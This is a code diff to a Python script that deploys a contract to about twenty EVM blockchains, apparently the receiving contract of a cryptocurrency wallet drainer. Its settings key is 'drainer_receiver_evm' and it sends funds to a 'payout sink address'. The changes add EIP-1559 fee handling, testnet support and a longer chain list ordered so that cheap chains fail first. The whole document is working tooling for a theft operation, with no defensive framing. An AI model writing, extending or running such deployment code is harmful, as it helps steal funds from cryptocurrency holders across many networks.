@@ -32,12 +32,11 @@ sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."
 import httpx
 from eth_account import Account
 from eth_abi import encode as abi_encode
-from eth_utils import keccak
 
 import abi
 import crypto
 import scanners
-from chains import EVM_NETWORKS
+from chains import EVM_NETWORKS, evm_network_names
 from database import get_setting, init_db, set_setting
 
 logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
@@ -104,6 +103,21 @@ async def verify(client: httpx.AsyncClient, net: str, contract: str,
         raise RuntimeError(f"payout mismatch on {net}: {got_payout} != {payout}")
 
 
+async def fee_fields(c: httpx.AsyncClient, net: str) -> Dict[str, int]:
+    """EIP-1559 on chains that price it; legacy gasPrice everywhere else."""
+    block = await rpc(c, scanners.rpc_for(net), "eth_getBlockByNumber", ["latest", False]) or {}
+    base_raw = block.get("baseFeePerGas")
+    base = int(base_raw, 16) if base_raw else 0
+    gas_price = max(int(await rpc(c, scanners.rpc_for(net), "eth_gasPrice", []), 16), 1)
+    if base <= 0:
+        return {"gasPrice": gas_price}
+    try:
+        priority = int(await rpc(c, scanners.rpc_for(net), "eth_maxPriorityFeePerGas", []), 16)
+    except Exception:                                        # noqa: BLE001
+        priority = max(base // 4, 1)
+    return {"maxFeePerGas": base * 2 + priority, "maxPriorityFeePerGas": priority}
+
+
 async def deploy(net: str, artifact: Dict[str, Any], key: str, payout: str) -> str:
     acct = Account.from_key(key)
     rpc_url = scanners.rpc_for(net)
@@ -112,8 +126,8 @@ async def deploy(net: str, artifact: Dict[str, Any], key: str, payout: str) -> s
                                              [acct.address, payout]).hex()
 
     async with httpx.AsyncClient(timeout=90.0) as c:
-        gas_price = int(await rpc(c, rpc_url, "eth_gasPrice", []), 16)
-        gas_price = max(gas_price, 1)
+        fee = await fee_fields(c, net)
+        cap = int(fee.get("gasPrice") or fee.get("maxFeePerGas") or 1)
 
         try:
             est = int(await rpc(c, rpc_url, "eth_estimateGas",
@@ -123,14 +137,12 @@ async def deploy(net: str, artifact: Dict[str, Any], key: str, payout: str) -> s
             log.warning("%s: estimate failed (%s), using %d", net, e, GAS_FALLBACK)
             gas = GAS_FALLBACK
 
-        await preflight(c, net, acct.address, gas * gas_price * 2)
+        await preflight(c, net, acct.address, gas * cap)
 
         nonce = int(await rpc(c, rpc_url, "eth_getTransactionCount",
                               [acct.address, "pending"]), 16)
         signed = acct.sign_transaction({
-            "chainId": chain_id, "nonce": nonce, "data": data, "gas": gas,
-            "maxFeePerGas": gas_price * 2,
-            "maxPriorityFeePerGas": max(gas_price // 4, 1),
+            "chainId": chain_id, "nonce": nonce, "data": data, "gas": gas, **fee,
         })
         tx_hash = await rpc(c, rpc_url, "eth_sendRawTransaction",
                             ["0x" + signed.raw_transaction.hex().removeprefix("0x")])
@@ -161,6 +173,8 @@ async def main() -> None:
     ap.add_argument("--chain", action="append", choices=list(EVM_NETWORKS),
                     help="limit to specific chain(s); repeatable")
     ap.add_argument("--payout", help="override the payout sink address")
+    ap.add_argument("--testnet", action="store_true",
+                    help="also deploy to testnets (skipped by default)")
     args = ap.parse_args()
 
     init_db()
@@ -182,7 +196,7 @@ async def main() -> None:
 
     artifact = load_artifact()
     existing = dict(get_setting("drainer_receiver_evm") or {})
-    targets = args.chain or list(EVM_ENVIRONMENTS_ORDER())
+    targets = args.chain or EVM_ENVIRONMENTS_ORDER(include_testnets=args.testnet)
 
     results: Dict[str, str] = {}
     failures: Dict[str, str] = {}
@@ -220,11 +234,18 @@ async def main() -> None:
         raise SystemExit(1)
 
 
-def EVM_ENVIRONMENTS_ORDER() -> List[str]:
-    """Ethereum first, then the cheap chains, so early failures cost little."""
-    order = ["Ethereum", "Base", "Arbitrum", "Polygon", "BSC"]
-    return [n for n in order if n in EVM_NETWORKS] + \
-           [n for n in EVM_NETWORKS if n not in order]
+def EVM_ENVIRONMENTS_ORDER(include_testnets: bool = False) -> List[str]:
+    """Cheap, high-volume chains first so early failures cost little; testnets last."""
+    order = ["Base", "Arbitrum", "Optimism", "Polygon", "BSC", "Ethereum",
+             "Avalanche", "Linea", "Scroll", "zkSync", "Mantle", "Gnosis",
+             "Celo", "Sonic", "Unichain", "Worldchain", "Berachain",
+             "HyperEVM", "Mode", "opBNB", "Fantom"]
+    mainnets = [n for n in order if n in EVM_NETWORKS]
+    mainnets += [n for n in evm_network_names(include_testnets=False) if n not in mainnets]
+    if not include_testnets:
+        return mainnets
+    testnets = [n for n in evm_network_names(include_testnets=True) if n not in mainnets]
+    return mainnets + testnets
 
 
 if __name__ == "__main__":
